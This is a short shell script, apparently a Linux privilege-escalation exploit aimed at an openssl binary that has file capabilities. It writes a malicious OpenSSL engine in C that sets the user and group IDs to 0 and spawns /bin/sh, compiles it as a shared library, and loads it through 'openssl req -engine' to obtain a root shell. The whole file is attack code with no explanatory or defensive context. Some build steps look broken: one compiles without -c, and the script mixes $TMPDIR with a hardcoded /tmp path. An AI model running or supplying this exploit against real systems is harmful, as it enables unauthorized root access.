#!/bin/sh

if getcap -r / | grep "openssl"; then
	cd $TMPDIR
	touch $TMPDIR/evil.c
	cat > $TMPDIR/evil.c << EOF
#include <openssl/engine.h>
#include <unistd.h>
static int bind(ENGINE *e, const char *id) {
setuid(0);
setgid(0);
system("/bin/sh");
}
IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
EOF
	gcc -fPIC evil.c -o evil.o
	gcc -shared -o evil.so -lcrypto evil.o
	openssl req -engine /tmp/evil.so
	printf "success...\n" && exit 0
else
	printf "something's wrong in here somewhere...\n" && exit 1
fi
